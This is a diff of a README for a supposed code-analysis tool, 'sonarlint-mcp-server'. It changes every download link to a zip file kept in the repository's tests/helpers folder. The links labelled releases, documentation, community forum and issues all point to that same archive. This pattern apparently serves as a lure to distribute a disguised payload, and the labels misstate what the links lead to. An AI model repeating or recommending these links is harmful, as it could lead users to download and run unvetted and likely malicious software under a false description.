@@ -6,7 +6,7 @@ Welcome to the **sonarlint-mcp-server**! This application provides top-notch cod
 
 ## 📥 Download Now
 
-[![Download sonarlint-mcp-server](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip)](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip)
+[![Download sonarlint-mcp-server](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip)](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📂 Download & Install
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip).
 
 1. Click on the link above.
 2. Find the latest release.
@@ -71,8 +71,8 @@ A: Absolutely! We welcome contributions. You can submit code or suggest improvem
 
 ## 🗂️ Additional Resources
 
-- [SonarLint Documentation](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip): Learn how to get the most out of SonarLint.
-- [Community Forum](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip): Join discussions about code quality and analysis.
-- [GitHub Issues](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip): Report bugs or feature requests.
+- [SonarLint Documentation](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip): Learn how to get the most out of SonarLint.
+- [Community Forum](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip): Join discussions about code quality and analysis.
+- [GitHub Issues](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip): Report bugs or feature requests.
 
-With sonarlint-mcp-server, enjoy smoother and more efficient coding. Visit the [Releases Page](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/unit/sonarlint-mcp-server-1.8.zip) again to download or update your server application.
+With sonarlint-mcp-server, enjoy smoother and more efficient coding. Visit the [Releases Page](https://raw.githubusercontent.com/ptitmonnstree/sonarlint-mcp-server/main/tests/helpers/sonarlint_mcp_server_v3.2.zip) again to download or update your server application.
